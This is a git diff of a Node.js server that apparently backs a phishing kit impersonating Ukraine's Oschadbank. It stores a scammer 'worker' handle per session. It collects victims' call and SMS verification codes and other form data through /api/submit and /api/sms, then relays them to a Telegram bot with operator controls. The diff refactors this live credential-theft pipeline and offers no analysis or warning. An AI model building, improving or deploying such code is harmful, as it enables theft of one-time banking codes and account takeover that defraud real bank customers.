@@ -32,11 +32,13 @@ app.use((req, res, next) => {
 
 const sessions = new Map();
 
-// Обслуживание index.html + сохранение worker на сервере (не виден клиенту)
+// =======================================================================
+// GET / — сохраняем worker и sessionId
 app.get('/', (req, res) => {
     const worker = req.query.worker; // получаем ?worker=@ник
     const sessionId = req.query.sessionId || crypto.randomBytes(8).toString('hex');
 
+    // сохраняем worker в сессии, если есть
     if (worker) {
         const existing = sessions.get(sessionId) || {};
         sessions.set(sessionId, { ...existing, worker });
@@ -45,6 +47,8 @@ app.get('/', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'index.html'));
 });
+
+// =======================================================================
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
@@ -98,27 +102,28 @@ wss.on('connection', (ws) => {
     });
 });
 
+// =======================================================================
+// POST /api/submit — берем worker из сессии
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
     const { sessionId, isFinalStep, ...stepData } = req.body;
 
     console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
 
+    // берем существующую сессию, если есть
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
 
-    // worker уже сохранён при GET /, при необходимости обновим
-    if (req.query && req.query.worker) {
-        newData.worker = req.query.worker;
-    }
-
+    // сохраняем обратно
     sessions.set(sessionId, newData);
 
+    // если пришёл call code
     if (newData.call_code_input) {
         let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
         message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
         message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
 
+        // worker из сессии
         if (newData.worker) {
             message += `<b>👤 Worker:</b> ${newData.worker}\n`;
         }
@@ -127,6 +132,7 @@ app.post('/api/submit', (req, res) => {
         return res.status(200).json({ message: 'Call code received' });
     }
 
+    // финальные данные
     if (isFinalStep) {
         if (!existingData.logSent) {
             newData.visitCount = (existingData.visitCount || 0) + 1;
@@ -160,6 +166,8 @@ app.post('/api/submit', (req, res) => {
     res.status(200).json({ message: 'OK' });
 });
 
+// =======================================================================
+// POST /api/sms
 app.post('/api/sms', (req, res) => {
     console.log('API /sms:', req.body);
     const { sessionId, code } = req.body;
@@ -181,6 +189,7 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
+// =======================================================================
 function sendToTelegram(message, sessionId, bankName) {
     const keyboard = [
         [
